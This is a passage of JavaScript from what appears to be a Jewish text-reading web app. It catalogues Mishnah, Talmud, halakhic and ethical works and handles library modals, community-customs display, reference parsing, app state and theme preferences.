                            { label: 'Demai', labelHe: 'דמאי', ref: 'Mishnah Demai', chapters: 7 },
                            { label: 'Kilaim', labelHe: 'כלאים', ref: 'Mishnah Kilaim', chapters: 9 },
                            { label: 'Sheviit', labelHe: 'שביעית', ref: 'Mishnah Sheviit', chapters: 10 },
                            { label: 'Terumot', labelHe: 'תרומות', ref: 'Mishnah Terumot', chapters: 11 },
                            { label: 'Maasrot', labelHe: 'מעשרות', ref: 'Mishnah Maasrot', chapters: 5 },
                            { label: 'Maaser Sheni', labelHe: 'מעשר שני', ref: 'Mishnah Maaser Sheni', chapters: 5 },
                            { label: 'Challah', labelHe: 'חלה', ref: 'Mishnah Challah', chapters: 4 },
                            { label: 'Orlah', labelHe: 'ערלה', ref: 'Mishnah Orlah', chapters: 3 },
                            { label: 'Bikkurim', labelHe: 'ביכורים', ref: 'Mishnah Bikkurim', chapters: 4 },
                        ]
                    },
                    {
                        title: 'Moed (Festivals)', titleHe: 'מועד',
                        items: [
                            { label: 'Shabbat', labelHe: 'שבת', ref: 'Mishnah Shabbat', chapters: 24 },
                            { label: 'Eruvin', labelHe: 'עירובין', ref: 'Mishnah Eruvin', chapters: 10 },
                            { label: 'Pesachim', labelHe: 'פסחים', ref: 'Mishnah Pesachim', chapters: 10 },
                            { label: 'Shekalim', labelHe: 'שקלים', ref: 'Mishnah Shekalim', chapters: 8 },
                            { label: 'Yoma', labelHe: 'יומא', ref: 'Mishnah Yoma', chapters: 8 },
                            { label: 'Sukkah', labelHe: 'סוכה', ref: 'Mishnah Sukkah', chapters: 5 },
                            { label: 'Beitzah', labelHe: 'ביצה', ref: 'Mishnah Beitzah', chapters: 5 },
                            { label: 'Rosh Hashanah', labelHe: 'ראש השנה', ref: 'Mishnah Rosh Hashanah', chapters: 4 },
                            { label: 'Taanit', labelHe: 'תענית', ref: 'Mishnah Taanit', chapters: 4 },
                            { label: 'Megillah', labelHe: 'מגילה', ref: 'Mishnah Megillah', chapters: 4 },
                            { label: 'Moed Katan', labelHe: 'מועד קטן', ref: 'Mishnah Moed Katan', chapters: 3 },
                            { label: 'Chagigah', labelHe: 'חגיגה', ref: 'Mishnah Chagigah', chapters: 3 },
                        ]
                    },
                    {
                        title: 'Nashim (Women)', titleHe: 'נשים',
                        items: [
                            { label: 'Yevamot', labelHe: 'יבמות', ref: 'Mishnah Yevamot', chapters: 16 },
                            { label: 'Ketubot', labelHe: 'כתובות', ref: 'Mishnah Ketubot', chapters: 13 },
                            { label: 'Nedarim', labelHe: 'נדרים', ref: 'Mishnah Nedarim', chapters: 11 },
                            { label: 'Nazir', labelHe: 'נזיר', ref: 'Mishnah Nazir', chapters: 9 },
                            { label: 'Sotah', labelHe: 'סוטה', ref: 'Mishnah Sotah', chapters: 9 },
                            { label: 'Gittin', labelHe: 'גיטין', ref: 'Mishnah Gittin', chapters: 9 },
                            { label: 'Kiddushin', labelHe: 'קידושין', ref: 'Mishnah Kiddushin', chapters: 4 },
                        ]
                    },
                    {
                        title: 'Nezikin (Damages)', titleHe: 'נזיקין',
                        items: [
                            { label: 'Bava Kamma', labelHe: 'בבא קמא', ref: 'Mishnah Bava Kamma', chapters: 10 },
                            { label: 'Bava Metzia', labelHe: 'בבא מציעא', ref: 'Mishnah Bava Metzia', chapters: 10 },
                            { label: 'Bava Batra', labelHe: 'בבא בתרא', ref: 'Mishnah Bava Batra', chapters: 10 },
                            { label: 'Sanhedrin', labelHe: 'סנהדרין', ref: 'Mishnah Sanhedrin', chapters: 11 },
                            { label: 'Makkot', labelHe: 'מכות', ref: 'Mishnah Makkot', chapters: 3 },
                            { label: 'Shevuot', labelHe: 'שבועות', ref: 'Mishnah Shevuot', chapters: 8 },
                            { label: 'Eduyot', labelHe: 'עדויות', ref: 'Mishnah Eduyot', chapters: 8 },
                            { label: 'Avodah Zarah', labelHe: 'עבודה זרה', ref: 'Mishnah Avodah Zarah', chapters: 5 },
                            { label: 'Avot', labelHe: 'אבות', ref: 'Mishnah Avot', chapters: 6 },
                            { label: 'Horayot', labelHe: 'הוריות', ref: 'Mishnah Horayot', chapters: 3 },
                        ]
                    },
                    {
                        title: 'Kodashim (Holy Things)', titleHe: 'קדשים',
                        items: [
                            { label: 'Zevachim', labelHe: 'זבחים', ref: 'Mishnah Zevachim', chapters: 14 },
                            { label: 'Menachot', labelHe: 'מנחות', ref: 'Mishnah Menachot', chapters: 13 },
                            { label: 'Chullin', labelHe: 'חולין', ref: 'Mishnah Chullin', chapters: 12 },
                            { label: 'Bekhorot', labelHe: 'בכורות', ref: 'Mishnah Bekhorot', chapters: 9 },
                            { label: 'Arakhin', labelHe: 'ערכין', ref: 'Mishnah Arakhin', chapters: 9 },
                            { label: 'Temurah', labelHe: 'תמורה', ref: 'Mishnah Temurah', chapters: 7 },
                            { label: 'Keritot', labelHe: 'כריתות', ref: 'Mishnah Keritot', chapters: 6 },
                            { label: 'Meilah', labelHe: 'מעילה', ref: 'Mishnah Meilah', chapters: 6 },
                            { label: 'Tamid', labelHe: 'תמיד', ref: 'Mishnah Tamid', chapters: 7 },
                            { label: 'Middot', labelHe: 'מידות', ref: 'Mishnah Middot', chapters: 5 },
                            { label: 'Kinnim', labelHe: 'קינים', ref: 'Mishnah Kinnim', chapters: 3 },
                        ]
                    },
                    {
                        title: 'Taharot (Purity)', titleHe: 'טהרות',
                        items: [
                            { label: 'Keilim', labelHe: 'כלים', ref: 'Mishnah Keilim', chapters: 30 },
                            { label: 'Oholot', labelHe: 'אהלות', ref: 'Mishnah Oholot', chapters: 18 },
                            { label: 'Negaim', labelHe: 'נגעים', ref: 'Mishnah Negaim', chapters: 14 },
                            { label: 'Parah', labelHe: 'פרה', ref: 'Mishnah Parah', chapters: 12 },
                            { label: 'Taharot', labelHe: 'טהרות', ref: 'Mishnah Taharot', chapters: 10 },
                            { label: 'Mikvaot', labelHe: 'מקוואות', ref: 'Mishnah Mikvaot', chapters: 10 },
                            { label: 'Niddah', labelHe: 'נידה', ref: 'Mishnah Niddah', chapters: 10 },
                            { label: 'Makhshirin', labelHe: 'מכשירים', ref: 'Mishnah Makhshirin', chapters: 6 },
                            { label: 'Zavim', labelHe: 'זבים', ref: 'Mishnah Zavim', chapters: 5 },
                            { label: 'Tevul Yom', labelHe: 'טבול יום', ref: 'Mishnah Tevul Yom', chapters: 4 },
                            { label: 'Yadayim', labelHe: 'ידיים', ref: 'Mishnah Yadayim', chapters: 4 },
                            { label: 'Oktzin', labelHe: 'עוקצין', ref: 'Mishnah Oktzin', chapters: 3 },
                        ]
                    }
                ]
            },
            talmud: {
                title: 'Talmud', titleHe: 'תלמוד',
                sections: [
                    {
                        title: 'Seder Zeraim', titleHe: 'סדר זרעים',
                        items: [
                            { label: 'Berakhot', labelHe: 'ברכות', ref: 'Berakhot 2a', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Seder Moed', titleHe: 'סדר מועד',
                        items: [
                            { label: 'Shabbat', labelHe: 'שבת', ref: 'Shabbat 2a', useRefGrid: true },
                            { label: 'Eruvin', labelHe: 'עירובין', ref: 'Eruvin 2a', useRefGrid: true },
                            { label: 'Pesachim', labelHe: 'פסחים', ref: 'Pesachim 2a', useRefGrid: true },
                            { label: 'Yoma', labelHe: 'יומא', ref: 'Yoma 2a', useRefGrid: true },
                            { label: 'Sukkah', labelHe: 'סוכה', ref: 'Sukkah 2a', useRefGrid: true },
                            { label: 'Beitzah', labelHe: 'ביצה', ref: 'Beitzah 2a', useRefGrid: true },
                            { label: 'Rosh Hashanah', labelHe: 'ראש השנה', ref: 'Rosh Hashanah 2a', useRefGrid: true },
                            { label: 'Taanit', labelHe: 'תענית', ref: 'Taanit 2a', useRefGrid: true },
                            { label: 'Megillah', labelHe: 'מגילה', ref: 'Megillah 2a', useRefGrid: true },
                            { label: 'Moed Katan', labelHe: 'מועד קטן', ref: 'Moed Katan 2a', useRefGrid: true },
                            { label: 'Chagigah', labelHe: 'חגיגה', ref: 'Chagigah 2a', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Seder Nashim', titleHe: 'סדר נשים',
                        items: [
                            { label: 'Yevamot', labelHe: 'יבמות', ref: 'Yevamot 2a', useRefGrid: true },
                            { label: 'Ketubot', labelHe: 'כתובות', ref: 'Ketubot 2a', useRefGrid: true },
                            { label: 'Nedarim', labelHe: 'נדרים', ref: 'Nedarim 2a', useRefGrid: true },
                            { label: 'Nazir', labelHe: 'נזיר', ref: 'Nazir 2a', useRefGrid: true },
                            { label: 'Sotah', labelHe: 'סוטה', ref: 'Sotah 2a', useRefGrid: true },
                            { label: 'Gittin', labelHe: 'גיטין', ref: 'Gittin 2a', useRefGrid: true },
                            { label: 'Kiddushin', labelHe: 'קידושין', ref: 'Kiddushin 2a', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Seder Nezikin', titleHe: 'סדר נזיקין',
                        items: [
                            { label: 'Bava Kamma', labelHe: 'בבא קמא', ref: 'Bava Kamma 2a', useRefGrid: true },
                            { label: 'Bava Metzia', labelHe: 'בבא מציעא', ref: 'Bava Metzia 2a', useRefGrid: true },
                            { label: 'Bava Batra', labelHe: 'בבא בתרא', ref: 'Bava Batra 2a', useRefGrid: true },
                            { label: 'Sanhedrin', labelHe: 'סנהדרין', ref: 'Sanhedrin 2a', useRefGrid: true },
                            { label: 'Makkot', labelHe: 'מכות', ref: 'Makkot 2a', useRefGrid: true },
                            { label: 'Shevuot', labelHe: 'שבועות', ref: 'Shevuot 2a', useRefGrid: true },
                            { label: 'Avodah Zarah', labelHe: 'עבודה זרה', ref: 'Avodah Zarah 2a', useRefGrid: true },
                            { label: 'Horayot', labelHe: 'הוריות', ref: 'Horayot 2a', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Seder Kodashim', titleHe: 'סדר קדשים',
                        items: [
                            { label: 'Zevachim', labelHe: 'זבחים', ref: 'Zevachim 2a', useRefGrid: true },
                            { label: 'Menachot', labelHe: 'מנחות', ref: 'Menachot 2a', useRefGrid: true },
                            { label: 'Chullin', labelHe: 'חולין', ref: 'Chullin 2a', useRefGrid: true },
                            { label: 'Bekhorot', labelHe: 'בכורות', ref: 'Bekhorot 2a', useRefGrid: true },
                            { label: 'Arakhin', labelHe: 'ערכין', ref: 'Arakhin 2a', useRefGrid: true },
                            { label: 'Temurah', labelHe: 'תמורה', ref: 'Temurah 2a', useRefGrid: true },
                            { label: 'Keritot', labelHe: 'כריתות', ref: 'Keritot 2a', useRefGrid: true },
                            { label: 'Meilah', labelHe: 'מעילה', ref: 'Meilah 2a', useRefGrid: true },
                            { label: 'Tamid', labelHe: 'תמיד', ref: 'Tamid 31a', useRefGrid: true },
                            { label: 'Niddah', labelHe: 'נידה', ref: 'Niddah 2a', useRefGrid: true },
                        ]
                    }
                ]
            },
            halakhah: {
                title: 'Halakhah', titleHe: 'הלכה',
                sections: [
                    {
                        title: 'Shulchan Arukh', titleHe: 'שולחן ערוך',
                        items: [
                            { label: 'Orach Chayim', labelHe: 'אורח חיים', ref: 'Shulchan Arukh, Orach Chayim 1', useRefGrid: true },
                            { label: "Yoreh De'ah", labelHe: 'יורה דעה', ref: "Shulchan Arukh, Yoreh De'ah 1", useRefGrid: true },
                            { label: 'Even HaEzer', labelHe: 'אבן העזר', ref: 'Shulchan Arukh, Even HaEzer 1', useRefGrid: true },
                            { label: 'Choshen Mishpat', labelHe: 'חושן משפט', ref: 'Shulchan Arukh, Choshen Mishpat 1', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Mishneh Torah (Rambam)', titleHe: 'משנה תורה (רמב"ם)',
                        items: [
                            { label: "Hilkhot De'ot", labelHe: 'הלכות דעות', ref: 'Mishneh Torah, Human Dispositions 1', useRefGrid: true },
                            { label: 'Hilkhot Shabbat', labelHe: 'הלכות שבת', ref: 'Mishneh Torah, Shabbat 1', useRefGrid: true },
                            { label: 'Hilkhot Teshuvah', labelHe: 'הלכות תשובה', ref: 'Mishneh Torah, Repentance 1', useRefGrid: true },
                            { label: 'Hilkhot Tefillah', labelHe: 'הלכות תפילה', ref: 'Mishneh Torah, Prayer and the Priestly Blessing 1', useRefGrid: true },
                            { label: 'Hilkhot Kashrut', labelHe: 'הלכות מאכלות אסורות', ref: 'Mishneh Torah, Forbidden Foods 1', useRefGrid: true },
                        ]
                    },
                    {
                        // Ordered by the reader's community (orderedLibraryItems):
                        // Sephardi and Mizrahi readers see their poskim first.
                        title: 'Later Authorities (Achronim)', titleHe: 'אחרונים',
                        minhagOrder: {
                            sephardi: ['Kaf HaChayim', 'Ben Ish Hai', 'Mishnah Berurah', 'Kitzur Shulchan Arukh', 'Aruch HaShulchan', 'Chayei Adam'],
                            ashkenazi: ['Mishnah Berurah', 'Aruch HaShulchan', 'Kitzur Shulchan Arukh', 'Chayei Adam', 'Kaf HaChayim', 'Ben Ish Hai'],
                        },
                        items: [
                            { label: 'Mishnah Berurah', labelHe: 'משנה ברורה', ref: 'Mishnah Berurah 1', useRefGrid: true },
                            { label: 'Kitzur Shulchan Arukh', labelHe: 'קיצור שולחן ערוך', ref: 'Kitzur Shulchan Arukh 1', useRefGrid: true },
                            { label: 'Aruch HaShulchan', labelHe: 'ערוך השולחן', ref: 'Aruch HaShulchan, Orach Chayim 1', useRefGrid: true },
                            { label: 'Chayei Adam', labelHe: 'חיי אדם', ref: 'Chayei Adam 1', useRefGrid: true },
                            { label: 'Kaf HaChayim', labelHe: 'כף החיים', ref: 'Kaf HaChayim on Shulchan Arukh, Orach Chayim 1', useRefGrid: true },
                            { label: 'Ben Ish Hai', labelHe: 'בן איש חי', ref: 'Ben Ish Hai, Halachot 1st Year, Bereshit 1', useRefGrid: true },
                        ]
                    }
                ]
            },
            kabbalah: {
                title: 'Kabbalah & Thought', titleHe: 'קבלה ומחשבה',
                sections: [
                    {
                        title: 'Ethics & Mussar', titleHe: 'מוסר',
                        items: [
                            { label: 'Pirkei Avot', labelHe: 'פרקי אבות', ref: 'Pirkei Avot', chapters: 6 },
                            { label: 'Mesillat Yesharim', labelHe: 'מסילת ישרים', ref: 'Mesillat Yesharim 1', useRefGrid: true },
                            { label: 'Duties of the Heart', labelHe: 'חובות הלבבות', ref: 'Duties of the Heart, Introduction 1', useRefGrid: true },
                            { label: 'Orchot Tzaddikim', labelHe: 'אורחות צדיקים', ref: 'Orchot Tzaddikim, Introduction 1', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Mysticism & Kabbalah', titleHe: 'קבלה ומיסטיקה',
                        items: [
                            { label: 'Tanya', labelHe: 'תניא', ref: 'Tanya, Likutei Amarim 1', useRefGrid: true },
                            { label: 'Zohar on Torah', labelHe: 'זוהר על התורה', ref: 'Zohar, Genesis 1a', useRefGrid: true },
                            { label: 'Sefer Yetzirah', labelHe: 'ספר יצירה', ref: 'Sefer Yetzirah 1', useRefGrid: true },
                        ]
                    },
                    {
                        title: 'Philosophy & Theology', titleHe: 'פילוסופיה ותאולוגיה',
                        items: [
                            { label: 'Guide for the Perplexed', labelHe: 'מורה נבוכים', ref: 'Guide for the Perplexed, Part 1 1', useRefGrid: true },
                            { label: 'Kuzari', labelHe: 'הכוזרי', ref: 'Kuzari 1', useRefGrid: true },
                            { label: 'Emunot ve-Deot', labelHe: 'אמונות ודעות', ref: 'Emunot ve-Deot, Introduction 1', useRefGrid: true },
                        ]
                    }
                ]
            },
            customs: {
                title: 'Community Customs', titleHe: 'מנהגים קהילתיים',
                sections: [
                    {
                        title: 'Sephardic Communities', titleHe: 'קהילות ספרדיות',
                        items: [
                            { label: 'Sephardic', labelHe: 'ספרדי', customsFile: 'Sefardic' },
                            { label: 'Moroccan', labelHe: 'מרוקאי', customsFile: 'Moroccan' },
                            { label: 'Iraqi', labelHe: 'עיראקי', customsFile: 'Iraqi' },
                            { label: 'Syrian', labelHe: 'סורי', customsFile: 'Syrian' },
                            { label: 'Turkish-Ottoman', labelHe: 'טורקי-עות׳מאני', customsFile: 'Turkish-Ottoman' },
                            { label: 'Persian', labelHe: 'פרסי', customsFile: 'Persian' },
                            { label: 'Bukharian', labelHe: 'בוכרי', customsFile: 'Bukharian' },
                            { label: 'Greek-Romaniote', labelHe: 'רומניוטי', customsFile: 'Greek-Romaniote' },
                        ]
                    },
                    {
                        title: 'Mizrachi & Eastern Communities', titleHe: 'קהילות מזרחיות',
                        items: [
                            { label: 'Yemenite', labelHe: 'תימני', customsFile: 'Yemenite' },
                            { label: 'Georgian', labelHe: 'גרוזיני', customsFile: 'Georgian' },
                            { label: 'Kavkazi / Mountain Jewish', labelHe: 'קווקזי', customsFile: 'Kavkazi' },
                            { label: 'Ethiopian', labelHe: 'אתיופי', customsFile: 'Ethiopian' },
                        ]
                    },
                    {
                        title: 'Ashkenazic Communities', titleHe: 'קהילות אשכנזיות',
                        items: [
                            { label: 'Ashkenazic', labelHe: 'אשכנזי', customsFile: 'Ashkenaz' },
                            { label: 'Chassidic', labelHe: 'חסידי', query: 'Chassidic customs and minhagim' },
                            { label: 'Litvish / Yeshivish', labelHe: 'ליטאי', query: 'Litvish Lithuanian Jewish customs' },
                        ]
                    }
                ]
            }
        };

        // What a library item does once the category modal has closed.
        function libraryItemAction(item) {
            if (item.chapters && item.chapters > 0) return () => openChapterGrid(item.ref, item.chapters);
            if (item.useRefGrid) return () => { void readText(item.ref); };
            if (item.customsFile) return () => { void displayCommunity(item.customsFile); };
            if (item.query) return () => setQuery(item.query);
            return null;
        }

        function libraryItemTypeLabel(item, isHe) {
            if (item.chapters && item.chapters > 0) return isHe ? `${item.chapters} פרקים` : `${item.chapters} ch.`;
            return isHe ? 'מנהגים' : 'Customs';
        }

        function libraryItemButton(item, isHe) {
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.className = 'chapter-grid-item';

            const numberSpan = document.createElement('span');
            numberSpan.className = 'chapter-grid-item-number';
            numberSpan.textContent = isHe ? (item.labelHe || item.label) : item.label;
            btn.appendChild(numberSpan);
            if (!item.useRefGrid) {
                const typeSpan = document.createElement('span');
                typeSpan.className = 'chapter-grid-item-label';
                typeSpan.textContent = libraryItemTypeLabel(item, isHe);
                btn.appendChild(typeSpan);
            }

            const action = libraryItemAction(item);
            if (action) {
                btn.onclick = () => {
                    closeLibraryCategory();
                    action();
                };
            }
            return btn;
        }

        // A section's items in the order its `minhagOrder` gives the reader's
        // community (Mizrahi readers share the Sephardi order); anything the
        // order doesn't name keeps its place after the named ones.
        function orderedLibraryItems(sec) {
            if (!sec.minhagOrder) return sec.items;
            const minhag = window.ShelahState?.getMinhag?.() || 'sephardi';
            const order = sec.minhagOrder[minhag === 'ashkenazi' ? 'ashkenazi' : 'sephardi'] || [];
            const rank = (item) => {
                const index = order.indexOf(item.label);
                return index === -1 ? order.length : index;
            };
            return sec.items.map((item, index) => ({ item, index }))
                .sort((a, b) => (rank(a.item) - rank(b.item)) || (a.index - b.index))
                .map(({ item }) => item);
        }

        function openLibraryCategory(key) {
            const cat = HOME_LIBRARY_CATEGORIES[key];
            if (!cat) return;
            const modal = document.getElementById('libraryCategoryModal');
            const titleEl = document.getElementById('libraryCategoryTitle');
            const subtitleEl = document.getElementById('libraryCategorySubtitle');
            const bodyEl = document.getElementById('libraryCategoryBody');
            if (!modal || !titleEl || !bodyEl) return;

            const isHe = isHebrewMode();
            titleEl.textContent = isHe ? cat.titleHe : cat.title;
            if (subtitleEl) subtitleEl.textContent = isHe ? 'בחר טקסט לקריאה' : 'Select a text to read';

            bodyEl.innerHTML = '';
            cat.sections.forEach(sec => {
                const secDiv = document.createElement('div');
                secDiv.className = 'chapter-grid-section-block';

                const secTitle = document.createElement('p');
                secTitle.className = 'chapter-grid-group-label mb-2';
                secTitle.textContent = isHe ? (sec.titleHe || sec.title) : sec.title;
                secDiv.appendChild(secTitle);

                const grid = document.createElement('div');
                grid.className = 'chapter-grid-section-items';

                orderedLibraryItems(sec).forEach(item => grid.appendChild(libraryItemButton(item, isHe)));

                secDiv.appendChild(grid);
                bodyEl.appendChild(secDiv);
            });

            modal.classList.add('flex');
            presentEl(modal, modalMotion(modal));
        }

        function closeLibraryCategory() {
            const modal = document.getElementById('libraryCategoryModal');
            if (!modal) return;
            dismissEl(modal, { ...modalMotion(modal), onHidden: () => modal.classList.remove('flex') });
        }

        // ─── COMMUNITY CUSTOMS MODAL ─────────────────────────────────────────
        // Prefer raw_data.halacha_index (original list), fall back to Object.values(customs)
        function customsHalachaIndex(data) {
            if (data.raw_data && Array.isArray(data.raw_data.halacha_index)) return data.raw_data.halacha_index;
            if (data.customs && typeof data.customs === 'object' && !Array.isArray(data.customs)) return Object.values(data.customs);
            if (Array.isArray(data.halacha_index)) return data.halacha_index;
            return [];
        }

        function customsItemHtml(item) {
            const practices = Array.isArray(item.common_practices)
                ? item.common_practices.map(p => `<li class="ml-4 list-disc text-slate-600">${escapeHtml(p)}</li>`).join('')
                : '';
            return `<div class="border border-slate-200 rounded-lg p-3 bg-white hover:bg-slate-50 transition">
                            <p class="font-semibold text-navy text-sm" dir="auto">${escapeHtml(isHebrewMode() && item.topic_he ? String(item.topic_he).trim() : communityLabelText(item.topic))}${communityConfidenceChip(item.confidence)}</p>
                            ${communityText(item, 'summary') ? `<p class="text-slate-600 text-sm mt-1" dir="auto">${escapeHtml(communityText(item, 'summary'))}</p>` : ''}
                            ${communityRabbiNote(item.confidence)}
                            ${practices ? `<ul class="text-sm mt-2 space-y-1" dir="auto">${practices}</ul>` : ''}
                            ${communityVariantsHtml(item.variants)}
                        </div>`;
        }

        // The customs grouped by category, each group a heading and its items.
        function customsGroupsHtml(halachaIndex) {
            const grouped = {};
            halachaIndex.forEach(item => {
                const cat = item.category || 'General';
                if (!grouped[cat]) grouped[cat] = [];
                grouped[cat].push(item);
            });
            return Object.entries(grouped).map(([cat, items]) => `<div class="mb-5">
                        <p class="chapter-grid-group-label mb-2" dir="auto">${escapeHtml(communityLabelText(cat))}</p>
                        <div class="space-y-3">${items.map(customsItemHtml).join('')}</div></div>`).join('');
        }

        const _customsCache = {};
        async function openCustomsModal(communityName, displayLabel) {
            // Reuse the libraryCategoryModal to display customs data
            const modal = document.getElementById('libraryCategoryModal');
            const titleEl = document.getElementById('libraryCategoryTitle');
            const subtitleEl = document.getElementById('libraryCategorySubtitle');
            const bodyEl = document.getElementById('libraryCategoryBody');
            if (!modal || !titleEl || !bodyEl) return;

            titleEl.textContent = displayLabel || communityName;
            if (subtitleEl) subtitleEl.textContent = isHebrewMode() ? 'מנהגים ופסיקות' : 'Community customs and rulings';
            bodyEl.setAttribute('aria-busy', 'true');
            bodyEl.innerHTML = `
                <div class="sk-prayer-row" aria-hidden="true"></div>
                <div class="sk-prayer-row" aria-hidden="true" style="width:85%"></div>
                <div class="sk-prayer-row" aria-hidden="true" style="width:70%"></div>`;
            modal.classList.add('flex');
            presentEl(modal, modalMotion(modal));

            try {
                let data = _customsCache[communityName];
                if (!data) {
                    const resp = await fetch(`/api/community/${encodeURIComponent(communityName)}`);
                    if (!resp.ok) throw new Error('Not found');
                    data = await resp.json();
                    _customsCache[communityName] = data;
                }

                const halachaIndex = customsHalachaIndex(data);
                if (!halachaIndex.length) {
                    bodyEl.innerHTML = `<p class="text-slate-400 text-sm italic">${isHebrewMode() ? 'אין נתונים זמינים' : 'No customs data available'}</p>`;
                    bodyEl.setAttribute('aria-busy', 'false');
                    return;
                }

                const html = customsGroupsHtml(halachaIndex);

                bodyEl.innerHTML = html;
                bodyEl.setAttribute('aria-busy', 'false');
            } catch {
                bodyEl.innerHTML = `<p class="text-red-400 text-sm">${isHebrewMode() ? 'שגיאה בטעינת המנהגים' : 'Error loading customs data'}</p>`;
                bodyEl.setAttribute('aria-busy', 'false');
            }
        }

        function normalizeChapterGridBookName(bookName) {
            const raw = String(bookName || '').replace(/\s+/g, ' ').trim();
            if (!raw) return '';

            const aliasMap = {
                '1 Samuel': 'I Samuel',
                '2 Samuel': 'II Samuel',
                '1 Kings': 'I Kings',
                '2 Kings': 'II Kings',
                '1 Chronicles': 'I Chronicles',
                '2 Chronicles': 'II Chronicles',
            };

            return aliasMap[raw] || raw;
        }

        function parseBookAndChapter(ref) {
            const raw = String(ref || '').replace(/\s+/g, ' ').trim();
            if (!raw) return null;

            const normalizedBookOnly = normalizeChapterGridBookName(raw);
            if (CHAPTER_GRID_BOOKS[normalizedBookOnly]) {
                return { book: normalizedBookOnly, chapter: 1 };
            }

            const withChapterMatch = CHAPTER_REF_RE.exec(raw);
            if (!withChapterMatch) return null;

            return {
                book: normalizeChapterGridBookName(String(withChapterMatch[1] || '').trim()),
                chapter: Number(withChapterMatch[2] || 0),
            };
        }

        function shouldOpenChapterGrid(ref) {
            const parsed = parseBookAndChapter(ref);
            if (parsed?.chapter !== 1) return null;
            const count = CHAPTER_GRID_BOOKS[parsed.book];
            if (!count || count <= 1) return null;
            return { book: parsed.book, chapters: count };
        }

        function parseIndexAndSection(ref) {
            const raw = String(ref || '').replace(/\s+/g, ' ').trim();
            if (!raw) return null;

            const chapterCandidate = raw.split(':')[0].trim();
            const match = INDEX_SECTION_RE.exec(chapterCandidate);
            if (!match) return null;

            const indexTitle = closeUpCommas(String(match[1] || '')).trim();
            const sectionToken = String(match[2] || '').trim().toLowerCase();
            if (!indexTitle || !sectionToken) return null;

            return {
                indexTitle,
                sectionToken,
            };
        }

        function shouldOpenReferenceGrid(ref) {
            const parsed = parseIndexAndSection(ref);
            if (!parsed) return null;

            // Open broad section selector when users start from a first-section ref.
            if (!/^(1|1a|2a)$/i.test(parsed.sectionToken)) {
                return null;
            }

            const tanakhBookName = normalizeChapterGridBookName(parsed.indexTitle);
            if (CHAPTER_GRID_BOOKS[tanakhBookName]) {
                return null;
            }

            return parsed.indexTitle;
        }

        function detectRegionalDefaults() {
            const timezone = String(Intl.DateTimeFormat().resolvedOptions().timeZone || '');
            if (/asia\/jerusalem/i.test(timezone)) {
                return { language: 'he', readerLayout: 'hebrew' };
            }
            return { language: 'en', readerLayout: 'bilingual' };
        }

        const regionalDefaults = detectRegionalDefaults();

        const appState = {
            suggestionItems: [],
            activeSuggestionIndex: -1,
            // The verse group under the references: 'loading' shows its
            // skeleton; `close` when nothing matched exactly (verse_search.py).
            verseSearch: { state: 'idle', close: false, items: [] },
            // The page on screen under any overlay (see routeViewOnScreen):
            // { type, value, view } with `view` the currentView it goes with.
            // null while a page is loading in its place.
            shownView: { type: 'home', value: null, view: null },
            prefs: {
                mode: 'balanced',
                community: 'All',
                webSearch: true,
                readerLayout: regionalDefaults.readerLayout,
                fontSize: 18,
                lineHeight: 1.8,
                showLeftSidebar: true,
                showRightSidebar: false,
                metadataFilters: {
                    era: '',
                    author: '',
                    category: '',
                    geography: '',
                    nusach: '',
                },
                transliteration: false,
                showVowels: true,
                showCantillation: true,
                shulMode: false,
                shulAutoScroll: false,
                shulScrollSpeed: 28,
                theme: 'light',
            },
            // Session-only "peek" state for the Shul-mode library sidebar -- NOT
            // persisted. Always starts collapsed whenever Shul mode is
            // (re-)enabled; see applyShulMode()/toggleShulLibrarySidebar().
            shulSidebarOpen: false,
            currentView: null,
            readingState: {},
            reliability: {
                lastHeartbeat: null,
                stats: null,
            },
        };
        window.appState = appState;
        const selectionCommentaryState = {
            groupedCommentaries: [],
            wordInfo: null,
            selectedText: '',
            activeCommentaryRef: '',
            // 'selection': the panel answers the passage the reader highlighted.
            // 'reading': the reader opened it without selecting anything, so it
            // lists the commentary on the verse they are on and follows them
            // as they read (see startReadingCommentary).
            mode: 'selection',
            readingRef: '',
        };
        let commentaryAvailableForCurrentSelection = false;
        let syncedPrefsUserId = null;
        // Whether the last refreshAuthUi() saw a signed-in user (null: not yet run).
        let lastAuthSignedIn = null;
        let shulScrollFrame = null;
        let inspectorPollInterval = null;
        // Tracks the previous applyShulMode() enabled state so it can reset the
        // sidebar "peek" below exactly on the false→true transition, not on every
        // call (e.g. the window-resize handler re-calls applyShulMode() on every
        // resize while Shul mode stays on, which must NOT re-collapse a sidebar
        // the user just peeked open).
        let shulModeWasEnabled = false;

        function getCurrentLanguage() {
            const raw = displayedLanguage || document.documentElement.getAttribute('lang') || 'en';
            return raw === 'he' ? 'he' : 'en';
        }

        function savedLanguage() {
            return localStorage.getItem('preferredLanguage') === 'he' ? 'he' : 'en';
        }

        function isHebrewMode() {
            return getCurrentLanguage() === 'he';
        }

        function containsHebrewLetters(text = '') {
            return /[\u05D0-\u05EA]/.test(String(text || ''));
        }

        function t(enText, heText) {
            return isHebrewMode() ? heText : enText;
        }

        const THEME_PREFERENCE_OPTIONS = ['light', 'dark', 'system'];

        function normalizeThemePreference(value) {
            const normalized = String(value || '').trim().toLowerCase();
            if (THEME_PREFERENCE_OPTIONS.includes(normalized)) {
                return normalized;
            }
            return 'light';
        }

        function getSystemThemePreference() {
            if (window.matchMedia?.('(prefers-color-scheme: dark)').matches) {
                return 'dark';
            }
            return 'light';
        }

        function getResolvedThemePreference(themePreference = appState?.prefs?.theme) {
            const normalized = normalizeThemePreference(themePreference);
            if (normalized === 'system') {
                return getSystemThemePreference();
            }
            return normalized;
        }

        function applyThemePreferenceClass() {
            const resolvedTheme = getResolvedThemePreference();
            const darkMode = resolvedTheme === 'dark';

            // data-theme drives tokens.css [data-theme="dark"] token overrides (FOUC-safe)
            document.documentElement.dataset.theme = darkMode ? 'dark' : 'light';
            document.documentElement.classList.toggle('theme-dark', darkMode);
            document.body.classList.toggle('theme-dark', darkMode);
            document.documentElement.style.colorScheme = darkMode ? 'dark' : 'light';
            document.body.style.colorScheme = darkMode ? 'dark' : 'light';
            // Dual theme-color <meta media="..."> tags in <head> handle PWA chrome natively.
        }

        function updateThemeToggleUi(lang = getCurrentLanguage()) {
            if (!themeToggleLabel) return;

            const pref = normalizeThemePreference(appState?.prefs?.theme);
            const modeLabels = {
